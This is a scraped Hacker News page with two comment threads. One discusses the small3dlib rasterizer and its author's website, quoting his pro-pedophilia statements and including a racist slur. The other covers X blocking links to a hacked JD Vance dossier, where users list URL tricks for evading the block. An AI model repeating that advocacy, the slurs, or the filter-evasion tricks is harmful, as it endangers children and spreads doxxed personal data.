about who writes interesting code. reply Beretta_Vexee 11 hours agorootparentprevHe is also the maintainer of a web browser whose specification seems to be ‘to leave as little trace as possible in the event of a police raid’, which is pretty suspicious. reply edm0nd 8 hours agorootparentThis is from his homepage. This dude is weird af. Certainly gives off some pedo incel vibes. >Since I've been banned from Wikipedia, here are some non-sexual, completely legal PHOTOS OF NAKED CHILDREN, hosted by Wikipedia itself: 1, 2, 3, 4. Please stop being afraid of nudity. and >Pedophilia is a sexual orientation and is completely natural, it is not a disorder, it should be morally and legally accepted. and >Censorship is always wrong, possesion and sharing of any kind of information, including any type of pornography, has to be legal and moral. and >I am quite lonely, if you want to FUCK let me know please (but I've never done it yet). What in the fuck lol reply jandrese 6 hours agorootparentDude is the king of incels. What I see is a lot of \"I'm lonely\" on the page, but at the same time he lives out in the woods and has the kind of personality that made this page. Dude would probably benefit greatly from some dude taking him under his wing and getting him cleaned up inside and out, but that is a huge task for anybody to consider. This guy is really far gone at this point. reply edm0nd 6 hours agorootparentHe extensively talks a ton about pedophilia. He for sure is a pedo. - https://meta.wikimedia.org/wiki/Special:CentralAuth/Drummyfi... - https://old.reddit.com/r/4chan/comments/7v5ihj/nobody_says_i... - https://old.reddit.com/r/UnethicalLifeProTips/comments/7axrc... The reason he was banned from Wikipedia is noted as: >Reason: WP:CHILDPROTECT: advocating defiance of \"arbitrary law-imposed age limits\" regarding sex & the legalization of child pornography at [https://web.archive.org/web/20230610082151/http://www.tastyf...] (page on a personal website that is linked openly on userpage.) History of on-wiki pedophile-coded conduct as well. reply jandrese 2 hours agorootparentI have a theory that in cases like this the pedophilia is more of a symptom of his living conditions. If the guy got cleaned up, made some real life fiends, and even started actually dating it would fade into the background. I would never hire him as a babysitter or schoolteacher, but he could live a normal life if he took care of the loneliness issue. reply edm0nd 2 hours agorootparentI'm not so sure. This guy lives off welfare, rants about being a pedo online, and is a 34 yr old self-admitted virgin. I think he's too far gone and fucked in the head mentally to be \"saved\" or being able to be molded into a productive citizen in society. reply diggan 5 hours agorootparentprev> He extensively talks a ton about pedophilia. He for sure is a pedo. I'm not sure why there is any doubt, \"child nudity\" is literally filed under \"Some things I like\" on his website. Not sure anyone needs any further evidence. reply immibis 10 hours agorootparentprevYour home can be raided for, say, running a Tor node, and you best believe they'll be looking for anything to charge you with because that's their job. I don't see anything wrong with this one. Fun fact: having nmap installed on your computer is illegal in Germany. reply danbruc 10 hours agorootparentFun fact: having nmap installed on your computer is illegal in Germany. That does not sound right and I am unable to find any source for that claim. EDIT: Nmap might fall under § 202c STGB [1] and »verschaffen« (obtain) probably does not even require installing it, downloading it would probably be sufficient. But my non-lawyer interpretation would be that this only applies if you are doing it for the purpose of a crime as it starts with »Wer eine Straftat nach § 202a oder § 202b vorbereitet, indem er [...]« (Who prepares a criminal act according to § 202a or § 202b by [...]). https://www.gesetze-im-internet.de/stgb/__202c.html reply immibis 1 hour agorootparentDo you think the police, when they raid your house on some pretext, will accept your argument that it wasn't to prepare for a crime? reply poincaredisk 2 hours agorootparentprevIn my country \"tools designed for hacking\" (simplifying legalese a bit) are illegal, but I'm not aware of anyone who was sentenced purely because of this. I think it might've been an additional charge during trials of actual cybercriminals. reply immibis 1 hour agorootparentIndeed. If they raid your house for running a Tor exit node and find nmap installed, they'll add on a hacking tools charge to your running a drug marketplace charge and your money laundering charge, and in court, the hacking tools charge will actually stick because you actually did that. reply Beretta_Vexee 10 hours agorootparentprevFun fact: I operated a TOR node for a while (not an exit node). It was in a datacenter and I mostly got yelled at because the IP was flagged as malicious outbound and the reputation of the IP range was degraded. I stopped the node but I still have the IP adress which is still inaccessible to most office workers years after ;-). At no time did I think that I was risking jail time if my computer was seized. I'm lucky enough to live in a democratic country and I have a clean conscience. There are two main types of people who are interested in TOR, the defence of privacy and the development of privacy protection software: - Those who think about the situation of homosexuals and journalists in countries where they risk the death penalty or life imprisonment. Police state, government overreach, woman health, etc... - Those who live in democratic countries but have a lot to hide. The two populations coexist but do not mix. reply PhilipRoman 7 hours agorootparentInteresting, I thought that only exit nodes carry a reputation risk. I guess there must be some really zealous scrapers who ban middle nodes based on the public list. reply Beretta_Vexee 7 hours agorootparentEntry nodes also run a big reputational risk. A number of list providers filter them. Many organisations want to prevent their users from accessing TOR to bypass filtering or exfiltrate data. reply mbivert 7 hours agorootparentprevHe also likes \"trolling\" and \"Flat Earth\"; this all might still be second degree, however distasteful. I mean, \"I am physically the most disgusting form of existence that ever lived\", seriously. If so, then people reacting so strongly — even negatively — would play into his hands. Hence the old age saying, \"thou shall not feed the troll\". He might even get one of those \"very generous one time donation\" thanks to all that attention. reply londons_explore 10 hours agorootparentprevI would consider personal non-technical idealoligies of the author of this code are off topic. reply WesolyKubeczek 5 hours agorootparentprevI’ve seen quite a few instances of excellent art produced by people whom I would classify as extremely abominable, so I think we should eat the fish, throw out the bones here. He’s quite the specimen, though. Wow. I remember reading stuff by crazy people on the old internet some years ago, he sure would fit right in. reply lifthrasiir 12 hours agorootparentprevSo disgusting that you should probably drop `https://` to make it not directly linked. I'm not only talking about \"usual\" stuffs, but he also overlaps with Terry A. Davis to me in the way that they are technically proficient and have potential to make a great thing but still remain very terrible as a person... reply xyproto 12 hours agorootparentTerry A. Davis had a mental illness, so it is a bit unfair to claim that he was very terrible as a person. If someone breaks a leg, they may be unable to walk, but may walk again when they are cured. It does not make them a non-walker as a person. I think the distinction between illness and identity is important. reply tecleandor 10 hours agorootparentAlso, was Davis that hateful? Haven't followed him, and what I know from him is mostly anecdotal, but apart from some slurs he mostly did long weird God and CIA unhinged posts, but not active hate edgelord stuff like what I see from this guy. reply diggan 8 hours agorootparentTake a look at some of his HN accounts (like https://news.ycombinator.com/threads?id=losethos) and judge yourself if it's hateful or not. Some would say the hateful language came only because of his disease, others the disease only added to existing behavior. Hard to know from the outside without really knowing him I'd say. reply edm0nd 5 hours agorootparentFor anyone else curious, you have to go into your HN settings and change showdead to YES in order to see all the majority of his Comments. Only two show up if not. reply tecleandor 8 hours agorootparentprevAh well, not great. I didn't know his HN accounts, I think I mostly read his site for TempleOS and something else (can't remember, it was long time ago so this was mostly a gut feeling). It's true it feels like it comes from a different place, but yep, not great. reply veltas 9 hours agorootparentprevHe never struck me as a cruel person, maybe a bit callous, and definitely very sick. reply dxuh 10 hours agorootparentprevHow do you know the drummyfish person doesn't have a mental illness either? Arguably most personality \"quirks\" are caused by either some medical issue or events in childhood, some of which can be addressed as an adult and \"sorted out\", but some of which cannot. It's entirely possible that drummyfish is a victim of some childhood trauma, which is likely easier to get into control than severe schizophrenia in the case of Terry Davis. To be clear I totally agree with you, but I am arguing that you never quite know where illness ends and identity starts and we should try to attribute less bad behavior to identity for everyone. reply lifthrasiir 12 hours agorootparentprevI mean, not exactly his fault but most people would still find it difficult to deal with him anyway. On the other hand, I'm actually less concerned about the identity stuff. I'm much more concerned about how he represents himself and makes multiple conflicting statements without any context in public. I don't want to judge how minor-attracted people should be considered in the society because I honestly have no idea, but the modern society at least in principle requires some tolerance in the value system and I can see absolutely no such evidence from the website. Never good for his identity even if we can accept that. reply edm0nd 8 hours agorootparentprev>Pedophilia is a sexual orientation and is completely natural, it is not a disorder, it should be morally and legally accepted. Dude is a pedo reply psychoslave 11 hours agorootparentprevI just skimmed it, but to my mind and judging only by the few sample texts I red, it seems that it’s really someone who suffers extreme loneliness and try to put \"pure logic without conscious will to make suffer anyone\" to some extreme reaching thus some bizarre conclusion. I mean, when I see people making video of themselves stating \"ĉiuj nigraj devas morti, vivu Hitler\" (\"all nigers must die, viva Hitler\" in Esperanto) in some easily accessible Telegram channels, it feels like a far harder case of \"Ok, this person is really on a wrong track, how can I help steer them to a saner state of mind?\". Also consider this: who is the most dangerous, someone like this person who publish without filter what is in their mind, or some sociopath making political plots through lies all day through promising consensual bullshits and ready to use all forms of violence to achieve their secret egoist goals? reply veltas 9 hours agorootparentI don't think anyone is personally scared, just not someone they want to follow or associate with. reply anthk 6 hours agorootparentprevRace realism died long ago when education mattered far most than genetics, at least on behaviour. - African tribe culture not used to give playtime/talk to kids when they are babies: behavioural problems raise at adulthood. - Western world used to it, no matter the class or money: potentially good adulthood. The problem is that the wealthy class didn't like to have educated citizens in Africa; but a brute workforce, like donkeys, to get nearly free raw goods. reply HeuristicsCG 13 hours agorootparentprevnext [6 more] [flagged] kstrauser 13 hours agorootparentI’m not so much concerned with their fiscal policy. > Pedophilia is a sexual orientation and is completely natural, it is not a disorder, it should be morally and legally accepted. is where I drew the line. Well, a line. There were plenty of lines to draw there. reply CaptainFever 12 hours agorootparentThey are correct. Note that pedophiles, on average, discover their orientation at 14 years old. They first experienced it when they were just 12, on average. 42% of MAPs (minor attracted persons) had suicidal thoughts at 16 years old. 32% had concrete plans for ending their life, and 13% actually attempted to end their life. The most common age of first suicide attempt for MAPs is 14 years old. Of those who attempted suicide, 36% were minors. Source: https://www.b4uact.org/research/survey-results/youth-suicida... (NOTE: If you are a hidden minor attracted person and this comment hasn't been flagged to oblivion, check out https://maphelp.page/ for self help resources, to keep yourself and children safe.) reply kstrauser 4 hours agorootparentI am sympathetic to someone diligent about not acting on their attraction to children. I’m attracted to adult women. I didn’t choose to be. I just am. I can’t imagine how much it’d suck if people wanted to kill me because I liked women. So in that sense, I feel bad for people attracted to kids who take steps to never, ever act on it. That would be a tough life to live. OTOH this guy claims to have “non-sexual” pictures of naked children on his website. Damned if I’m going to click through to see if his idea of non-sexual is the same as mine. Someone advocating pedophilia while collecting pictures of naked children is beyond the pale. That’s acting on it. I cannot and will not tolerate, let alone accept, that action. reply lifthrasiir 12 hours agorootparentprevWhile I see what you tried to mean, that doesn't justify what was quoted above. At the very least, it alone can't determine whether it's a disorder and/or sexual orientation or not. reply CaptainFever 12 hours agorootparentFair enough, I agree that the word disorder or orientation is not supported by my evidence*. But it does support that, for non-contact minor attraction at least, it should be morally and legally accepted (this was what I was trying to reply to). It is actually a marginalised group. The MAPs (minor attracted people) most vulnerable and prone to suicide are actually children themselves, as supported by the evidence. *For non-contact minor attraction, I believe it is not a disorder because it does not affect functioning in society (it doesn't harm others), nor does it impact functioning in occupational contexts. But you're correct that this was a separate point and shouldn't have been conflated. reply otabdeveloper4 13 hours agorootparentprevnext [3 more] [flagged] sham1 10 hours agorootparentPeople using their free speech and free association is now \"policing thoughtcrime\"? It's always interesting how that works. Ought we not be allowed to make an informed decisions about whether we want to use a piece of tech? Or whether we wish to associate with an individual? reply sibane 9 hours agorootparentprevHis website also lists \"child nudity\" as one of his passions, so let's not pretend that we're just talking about some unconventional political beliefs. reply skinner927 15 hours agoprevI know nothing of this topic, but it sure looks neat. A few features that are great to see are: - No dynamic heap allocation. - No dependencies - C99 Maybe it’s time for me to learn something new. reply ocean_moist 11 hours agoprevThere is something so satisfying about software written in C99 with this style/philosophy. This program has just the right amount of complexity. This is an art that needs to come back into style. reply Thorham 9 hours agoparentLua is written in C89, perhaps a good example of that. reply timkq 7 hours agoprevI implore you all to read the coder's website, http://www.tastyfish.cz This is one of the craziest rabbit holes I've been through. That being said, the guy sure can code, but judging by the website and its content, he can't AT ALL function in a normal society. His \"wiki\" is a cesspool of cognitive dissonance. I don't even think flat earthers or other anti-system people have that much cognitive dissonance going on. In short - this guy is as if someone took the worst opinions from a left-wing person and the worst opinions from a right-wing person. I hope he can get treated for whatever condition he has and live normally. I feel sorry for him. reply maicro 4 hours agoparentYeah, I'll just throw this here seeing as the other main thread on here is so long - his website _is_ wild, and I'm not prepared or willing to go through and figure out where all we agree and disagree. BUT, the linked library is public domain, and the dude's website specifically says he's against forced attribution [0], so one should feel completely free to use the library and his other projects without even mentioning the author. [0] \"Attribution mustn't be forced and the requirement of attribution (e.g. by a license) is inherently wrong.\" https://www.tastyfish.cz/#:~:text=Attribution%20mustn%27t%20.... reply anthk 6 hours agoparentprevAlso he is afraid of women. Come on, most scientists, mathematicians and programmers would love to have a smart and curious partner. reply timkq 4 hours agorootparentMy point exactly! (Well not only being afraid of them, but also being a fan of them being objectified and generally being treated as less..) In his case, being (mostly) straight (taken from his website) means being doomed from ever having a partner - if he dislikes the gender he's attracted the most to. reply noncoml 14 hours agoprevNote that it’s not by “Suckless (TM)”. I.e. not affiliated to https://suckless.org/ reply rollcat 9 hours agoparentI think at this point \"suckless\" (as a quality) is pretty much understood in the same way as \"free software\", and firmly distinct from \"suckless.org e.V.\" or \"Free Software Foundation\". reply stirfish 7 hours agorootparentI assumed it was suckless.org, so I appreciated the distinction reply mungoman2 13 hours agoprevThis is very cool and a very impressive effort. I want to discuss though if \"real\" 3D is the right solution for such constrained platforms. The aliasing is quite extreme due to large pixels and lack of filtering. A more constrained 3D renderer or faking 3D with billboards may be better suited for these platforms. Then the aliasing can make it look more like pixel art than the unstructured noise a real render gives. reply fsloth 13 hours agoparent“ The aliasing is quite extreme ” One interesting thing in becoming a graphics expert and discussing graphics with non-graphicsprogrammers, is that many don’t care about aliasing. Aliasing in sound is usually painfully untolerable. It does not seem to be like that in graphics. Based on this, I dont’t think aliasing is a technical critical fault - it should be considered a specific aesthetic IMHO. As long as people can perceive the shape of the geometry information displayed, it’s ‘fit for purpose’. If one is rendering in constrained environments I’m fairly sure they’ve made peace with the platform limitations. (I’m not arguing for aliasing, just that in many practical cases it does not actually matter) reply badsectoracula 12 hours agorootparent> it should be considered a specific aesthetic IMHO Case in point, in a 3D platform/adventure game i made back in 2020 for an MSDOS game jam[0], the rasterizer has intentional \"flaws\" - like lack of subpixel and subtexel accuracy, no zbuffering and no perspective correction (and perhaps unintuitively, the last two actually made the whole renderer more complex) because i had in my mind a specific \"glitchy\" look. Adding those would be trivial (and probably speed up the rendering a bit on 90s hardware), but things like the wavy lines (as seen in the first shot) and \"trembling\" vertices are intentional. Similarly when i ported the game to use 3D hardware APIs, i went for full bilinear filtering because i wanted that 90s \"just ported our SW 3D game to use 3dfx\" style that a lot of 90s 3D games had (and FWIW the game also runs on an actual Voodoo 1 too[1] :-P). Though i do know some people dislike it so i added an option to disable it. [0] https://bad-sector.itch.io/post-apocalyptic-petra [1] https://i.imgur.com/JssBdox.jpg reply anthk 4 hours agorootparentI forgot about taht game, I loved it. source for the rest: https://codeberg.org/badsector/PetraEngine reply snatchpiesinger 5 hours agorootparentprev> Aliasing in sound is usually painfully untolerable. It does not seem to be like that in graphics. It's tolerable in graphics in many cases, but becomes painfully obvious when the spatial frequency of some model approaches the pixel grid's frequency, and you get very distracting Moiré patterns. edit: But I guess in 3D rendering you deal with this differently, probably. You probably don't want to spend resources on painting model details that are half a pixel in size, so they get entirely culled, instead of causing any Moiré problems. reply jmspring 14 hours agoprevLike below, I’m not the target market outside this is interesting enough for me to maybe considering for a project I’m playing with. I love the old school graphics. reply webprofusion 14 hours agoprevDefinitely had to read that subject line twice. reply PicassoCTs 11 hours agoprevSometimes you just want to show things, without showing things off.. reply GaryNumanVevo 6 hours agoprevSadly, I'm getting Terry Davis vibes from this particular developer. I hope they seek help. reply mr_sahbaz_000 15 hours agoprev [2 more] [flagged] widge 14 hours agoparent [–] ? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "\"small3dlib\" is a public domain 3D software rasterizer designed for resource-limited computers, using only 32-bit integer math and no dependencies, making it extremely portable.",
      "It offers various features like perspective correction, different drawing strategies, and flexibility in pixel rendering, but lacks advanced features like shaders, collision detection, and antialiasing.",
      "The library is ideal for quick 3D projects without the complexity of OpenGL or Vulkan, and is highly customizable, though it does not prioritize backward compatibility."
    ],
    "commentSummary": [
      "Small3dlib is a public domain 3D software rasterizer available on Codeberg, created by a user named drummyfish.",
      "The creator of Small3dlib has controversial and offensive views, including being an open advocate for pedophilia and \"race realism,\" which has sparked significant backlash and discussion.",
      "Despite the technical merits of the software, the creator's personal beliefs and statements have led to a broader debate about the separation of art (or code) from the artist and the ethical implications of using such software."
    ],
    "points": 212,
    "commentCount": 96,
    "retryCount": 0,
    "time": 1727402641
  },
  {
    "id": 41662702,
    "title": "X (Twitter) blocks links to hacked JD Vance dossier",
    "originLink": "https://www.theverge.com/2024/9/26/24255298/elon-musk-x-blocks-jd-vance-dossier",
    "originBody": "Twitter - X/ Tech/ Politics X blocks links to hacked JD Vance dossier X blocks links to hacked JD Vance dossier / And suspends the journalist who published it. By Elizabeth Lopatto, a reporter who writes about tech, money, and human behavior. She joined The Verge in 2014 as science editor. Previously, she was a reporter at Bloomberg. Sep 26, 2024, 7:36 PM UTC Share this story Illustration by Kristen Radtke / The Verge; Getty Images X is preventing users from posting links to a newsletter containing a hacked document that’s alleged to be the Trump campaign’s research into vice presidential candidate JD Vance. The journalist who wrote the newsletter, Ken Klippenstein, has been suspended from the platform. Searches for posts containing a link to the newsletter turn up nothing. A screenshot of a search for a link to Ken Klippenstein’s newsletter. A search with the result “No results for https://www.kenklippenstein.com/p/read-the-jd-vance-dossier” The document allegedly comes from an Iranian hack of the Trump campaign. Though other news outlets have received information from the hack, they declined to publish. Klippenstein says in his newsletter that a source called “Robert,” with an AOL email address, offered him the document. Contained in it are what appear to be Vance’s full name, addresses, and part of his social security number. X said in a post on its safety account that Klippenstein was “temporarily suspended for violating our rules on posting unredacted private personal information.” The company didn’t comment on why links to Klippenstein’s article are blocked. The X account for Klippenstein’s newsletter confirmed the reasoning for the ban. “Ken Klippenstein has been banned by Twitter for publishing private information in contradiction of its rules,” wrote KlipNews. Twitter, before it was bought by Elon Musk, had a policy regarding hacked materials — but the page is no longer available. A pre-Musk version of the policy, dated 2019, stated that posting or linking to hacked content is prohibited. Under this policy, links to a story by The New York Post about Hunter Biden, the current president’s son, were banned. But in October 2020, Twitter changed its policy to say that it would no longer block hacked materials, after an outcry about how the company had handled the Post story. “Straight blocking of URLs was wrong, and we updated our policy and enforcement to fix,” wrote then-CEO Jack Dorsey. Musk was one of the people who was unhappy with the decision to ban links to the Post’s story. “Suspending the Twitter account of a major news organization for publishing a truthful story was obviously incredibly inappropriate,” Musk wrote of the decision on the story in April 2022. He even invited former Rolling Stone pundit Matt Taibbi to examine internal documents showing how Twitter handled the decision. (In the course of tweeting his conclusions, Taibbi exposed the email addresses of Dorsey and Representative Ro Khanna.) It is unclear why X is blocking Klippenstein’s story, but attempts by three staffers at The Verge to post links of Klippenstein’s newsletter failed. We received error messages that read, “We can’t complete this request because this link has been identified by X or our partners as being potentially harmful. Visit our help center to learn more.” Screenshot of my test post Update, September 26th: Added comment from X’s safety account. Most Popular Most Popular The Toyota Prius and Rav4 are no longer Prime X blocks links to hacked JD Vance dossier Don’t ever hand your phone to the cops I played the PS5 Pro, and it’s clearly better Meta’s big tease Verge Deals / Sign up for Verge Deals to get deals on products we've tested sent to your inbox weekly. Email (required)Sign up By submitting your email, you agree to our Terms and Privacy Notice. This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply. From our sponsor Advertiser Content From",
    "commentLink": "https://news.ycombinator.com/item?id=41662702",
    "commentBody": "X (Twitter) blocks links to hacked JD Vance dossier (theverge.com)200 points by jeromegv 22 hours agohidepastfavorite116 comments rideontime 22 hours agoThe block is very amateurishly implemented, and can be circumvented by appending any query param to the URL, like so: https://www.kenklippenstein.com/p/read-the-jd-vance-dossier?... Update: I guess someone at Twitter reads Hacker News, because they finally forced me to delete the posts containing those links, a few hours later. reply 12_throw_away 22 hours agoparentThat's hilarious because their filters are sophisticated enough to block archive.is links to the same URL ... but can still be defeated with a query param. Seems like one of these was implemented at Twitter 1.0, and the other at Twitter 2.0. reply 12_throw_away 21 hours agorootparentWell, looks like they finally figured it out - but it's a hacky fix, they're still not using a proper URL parser. Here are some of the ways you can trick badly implemented URL parsers (haven't tested all of them on twitter specifically, but at least a couple do indeed work): authority: https://user:pass@host/[..] anchors: https://[...]/path#anchor path params: https://host/path;param/[...]` port: http://host:80/[...]` reply throwawayk7h 21 hours agorootparentI'm quite sure they're reading this thread. Fully expecting you to post again in 20 minutes haha. reply millzlane 21 hours agorootparentI'm sure Uncle Musk is scrolling through this thread yelling at his people asking \"Why aren't we doing this!? Can we do this?\" reply ysofunny 22 hours agoparentprevwow, I suppose this is the quality you get when you fire all the workforce \"it's just code after all\" reply netsharc 22 hours agorootparentI hope it's some developer implementing Elmo's order of \"Block this exact url\" with malicious compliance, knowing about the possible workarounds. (Could you replace e.g. an \"a\" with %61 and keep the URL working?) reply dlivingston 22 hours agorootparent\"Elmo\"? Why the nickname? reply SimianSci 21 hours agorootparentIt has been widely speculated that Elon, or someone close to him, has operated a large bot farm for the past decade focused on influence operations around his persona. References online to 'Elon' show a marked difference in bot activity than those that refer to him as 'Elmo.' Language ambiguity is a good tool to employ against influence operations. reply 2OEH8eoCRo0 20 hours agorootparentI've long speculated that fixing the \"bot problem\" means the problem of his bots being removed. reply phatfish 21 hours agorootparentprevBecause Elon likes nicknames. Remember \"pedo guy\"? reply rsynnott 11 hours agorootparentprevHere, it’s slightly gratuitous, but on Twitter, even pre-Musk Twitter, Musk was one of the people who it was best not actually to name when talking about them, as mentioning his name tended to summon his weird fans. So, nicknames. reply thih9 21 hours agorootparentprevTraces back to 2022: https://www.businessinsider.com/twitter-insiders-users-calli... > It began as a joke, one of the people said, given the close spelling of the Muppet's name to Musk's own and the irony of Musk's temperamental personality in contrast to that of the kind and curious \"Sesame Street\" character. > However, use of Elmo to discuss Musk has become more commonplace in recent weeks, as Musk has turned Twitter into \"a dictatorship,\" one former employee said. There are potentially fewer repercussions from criticizing your billionaire boss if you can argue you were discussing a puppet, not the CEO. > Elmo is also gaining traction as a nickname for Musk on Twitter itself. Thousands of recent Tweets and comments clearly discussing Musk only mention the Muppet by name. Discussing Musk under his new nickname keeps the CEO from trending and it keeps critics out of his mentions. reply nonrandomstring 21 hours agorootparentYup what a total muppet. Guy seems to have a problem with names. What makes me laugh is he just can't make \"X\" stick. Every time I see it written X (formerly Twitter) am thinking it's less characters to just type Twitter. Everyone still calls it Twitter. Only journalists swallowed the X thing, and they're tiring of it now. Fuck it, just change the name back to Twitter and admit defeat. Using X in any sentence looks ridiculous and ambiguous, If people used to tweet what do they do now? Send kisses? \"The president XXxed (formerly tweeted) yesterday on X (formerly Twitter)...\" sigh reply alsetmusic 22 hours agorootparentprevI thought everyone was going to work hardcore to offset that. Oh well. reply klyrs 22 hours agorootparentprevMusk would have identified the bug if only the programmer had printed their code. reply talldayo 22 hours agorootparentprevImagine being an original Twitter employee that's still stuck around. You could ask for a 7-figure salary, and your toughest job would be implementing a regex filter for the JD Vance leak. reply klyrs 22 hours agoprevWow, good job Elon. I've downloaded the dossier and I'm telling my friends. Send Barbara Streisand my regards! reply grahamj 22 hours agoparentYep, I only found out about it because of this news reply abraxas 22 hours agoprevElmo's \"radical free speech\" on full display. reply listenallyall 22 hours agoparentDocuments obtained via hacks don't qualify under \"free speech\" and should be blocked, just like you'd block a list of people's social security numbers obtained via hacking, or secretly-recorded nude/pornographic material (without the subject's knowledge or consent). reply chgs 22 hours agorootparentYet more definitions of free speech that some agree with and some disagree with. That’s fine, block whatever you want. Just don’t whine that others have a different view on what “free speech” means. reply ToValueFunfetti 21 hours agorootparent\"Whining about other people having different views\" accounts for pretty much all political speech, and I don't understand why you're saying it shouldn't happen on this topic. reply llamaimperative 21 hours agorootparentIf you believe 1st Amendment protections extend to prevent censorship from private parties, as Elon et al claim to, then banning this material is unambiguously a violation of free speech. If you don’t believe that’s what free speech is, then that’s fine too (and you’re right), but then stop using that as a cultural cudgel. reply listenallyall 21 hours agorootparentThe First Amendment most certainly does not apply to private parties. reply llamaimperative 21 hours agorootparentCorrect. Which is why the right wing moaning about free speech with regard to content moderation is juvenile and, as OP illustrates, completely hypocritical. reply ToValueFunfetti 21 hours agorootparentprevI do agree that this is unambiguously a violation of free speech, though the first amendment doesn't enter into it. What I don't get is the last bit, which you've only restated- why shouldn't people be allowed to invoke free speech on the basis of their opinions on what it means? reply llamaimperative 20 hours agorootparentBecause at least in America “free speech” refers to 1st Amendment protections, which this does not violate. “Free speech” does not mean “carte blanche protection from any repercussions from anything I say, everyone is still obligated to like me and be nice to me and do business with me.” reply ToValueFunfetti 20 hours agorootparentSo when the first amendment says congress shall make no law abridging freedom of speech, that's self-referential and does not refer to an underlying basic human right? Or are you saying that Americans just don't care about why the bill of rights exists anymore because the constitution is now their sole source of morality? reply klyrs 18 hours agorootparentCrux of the problem: > everyone is still obligated to like me and be nice to me and do business with me. That takes force. You can't ask the government to protect you from the consequences of your speech, because that violates the free association of others. reply ToValueFunfetti 15 hours agorootparentI'm really just addressing >Because at least in America “free speech” refers to 1st Amendment protection Which I took to be the part that tried to answer why 'whining that others have a different view on what “free speech” means' is somehow bad behavior in a way that other political speech isn't. I really had no intention of discussing my position on free speech, but briefly: It is morally good for an entity to permit freedom of speech and it is morally bad for them to suppress it, but I don't think the government has any business pushing them in either direction. reply llamaimperative 16 hours agorootparentprevCorrect^ In fact, even more philosophically, the marketplace of ideas needs ways to select ideas. The bad way to apply selection pressure is with the state (thus the 1st Amendment). The good way to apply selection pressure is to have other people tell you you are an absolute fucking moron and refuse to associate with you. That's what free speech really looks like. reply intermerda 19 hours agorootparentprevFor 33-45% Americans, the only source of morality is what the Orange Dear Leader says. That's why they are fine with supporting a candidate who openly calls for jailing people who criticize the Supreme Court judges and wanted to shoot protesters in legs. reply listenallyall 21 hours agorootparentprevWell, numerous jurisdictions have passed laws against \"revenge porn\", so they seem to agree with my suggestion. I will agree that information gathered via hacking can be seen both ways (much of Wikileaks was gathered somewhat nefariously) but the idea of blocking should not automatically be considered a suppression of free speech. reply cdchn 21 hours agorootparentprevExcept the indisputable public interest in having information about the person sitting on deck for the most powerful position in the world, as opposed to the prurient interests in seeing leaked nudes. reply SmartJerry 21 hours agorootparentHow is the vice presidential candidates social security number, phone number, and home address in the public interest? reply matwood 7 hours agorootparentIs SSN, phone, and home address repeated for ~200 pages? Seems like there's more to it than just that data. reply BobaFloutist 19 hours agorootparentprevSo that if we see his SSN released in a future hack we can be sure to text him a warning to freeze his credit, and he can apply for two months of free credit monitoring. reply arcatech 17 hours agorootparentprevIt’s not, but the rest of the content is. reply cogman10 21 hours agorootparentprevYou mean like the nude photos of hunter biden, stolen from his personal laptop, and shared across twitter without any changes? That sort of free speech? reply drawkward 36 minutes agorootparentprevDo they qualify under \"free speech absolutist\"? reply rsynnott 11 hours agorootparentprevAs always, it is MOST improper on this website to actually read the article, but this is addressed in the article; Musk was upset when old-Twitter blocked an article containing hacked data. Appears to be a case of ‘free speech’ for me but not for thee. reply jeromegv 21 hours agorootparentprevSo why did Elon complained when Twitter censored the Laptop Biden leak? This was the same policy, documents obtained via hacks. reply paulgb 21 hours agorootparentThat's what I'm wondering, isn't his behavior now pretty much exactly what the whole Twitter Files thing was about? https://en.wikipedia.org/wiki/Twitter_Files reply wormius 20 hours agorootparentIt's almost as if he's not a good faith actor. reply and0 21 hours agorootparentprevYeah, he updated the ToS when he took over to allow the Hunter Biden material. reply listenallyall 21 hours agorootparentprevAre you talking about Hunter Biden's laptop? It wasn't hacked, he left it at a computer shop and never picked it up. reply cogman10 21 hours agorootparentYou don't get to rummage through someone's computer just because it's in your possession. That's not how the law or property works in the US. The shop owner made an illegal copy of Hunter's hard drive and then went forward and shared it with a bunch of people. reply listenallyall 17 hours agorootparentIt seems like you do, in certain situations, this being one of them. Otherwise someone would have been prosecuted for making an illegal copy, as you say. Further, such evidence would be considered \"illegal search and seizure\" and inadmissible in court as evidence against Hunter Biden. But that isn't happening, the laptop information is/was absolutely used as evidence. https://www.cnn.com/2024/05/22/politics/hunter-biden-laptop-... reply jpadkins 20 hours agorootparentprevHe tried to get Hunter to pay for the repairs several times, and then took possession of the laptop as payment for services after a year or more. That is legal in the US. Given how public this story was, if what he did was illegal, local DA would have prosecuted him. Hunter Biden abandoned the laptop. The Intel agencies and the corp media tried to cover it up. reply nemothekid 20 hours agorootparentprevHim \"leaving\" it a computer shop was never credibly, regardless what a bizarre line in the sand. reply glenndebacker 7 hours agorootparentprevThe personal information is blacked out... and Elmo still seem to block people for 12 hours when you share the link. reply 2OEH8eoCRo0 22 hours agorootparentprevRidiculous. He's a VP candidate so these things are definitely in the public's interest and reporters report on ill-gotten documents all the damn time. https://www.kenklippenstein.com/p/read-the-jd-vance-dossier reply slowmovintarget 15 hours agorootparentHis home address and social security number are not material nor part of the \"public interest\" and a legitimate reporter would have excluded them. reply SmartJerry 21 hours agoparentprevDoxing someone is not free speech. Documents aren't just 'hacked documents' when they include private information. reply danillonunes 20 hours agorootparentThe thing about free speech is that everyone has their own criteria of what should or should not be included into it. When someone talks about \"free speech absolutist\", one expects they will include everything. No exceptions. After all, that's what the \"absolutist\" is supposed to be doing here. If you want to add exceptions to free speech, then you're not an absolutist. You just have the same lame relativist free speech definition as everyone else. Except your criteria is different than the others. Which, I mean, no problem, but at least be honest. reply SmartJerry 1 hour agorootparentIf you believe that is free speech, post your SSN, phone number, and address here right now, or would you be fine if i posted them for you? reply sys32768 22 hours agoprevX (Twitter) policy on sharing private information: https://help.x.com/en/rules-and-policies/personal-informatio... Among others it prohibits sharing: >home address or physical location information, such as street addresses, GPS coordinates, or other identifying information related to locations that are considered private reply srid 21 hours agoparentAs it applies to JD Vance, > X suspended Ken Klippenstein after he shared the Iranian-hacked dossier on J.D. Vance, which doxed his home addresses, phone numbers, emails, and social security number. https://x.com/KanekoaTheGreat/status/1839382777223164033 Official message from X Safety, > Ken Klippenstein was temporarily suspended for violating our rules on posting unredacted private personal information, specifically Sen. Vance’s physical addresses and the majority of his Social Security number. https://x.com/Safety/status/1839392663864549688 reply kenjackson 17 hours agorootparentSo if those pieces of information are redacted then the document can be freely shared on X? This seems simple enough to test. reply coreyh14444 12 hours agoparentprevWhat about Hunter Biden's laptop? This was mentioned as a key reason Elon bought Twitter in the first place. And those documents contained way more sensitive data than the 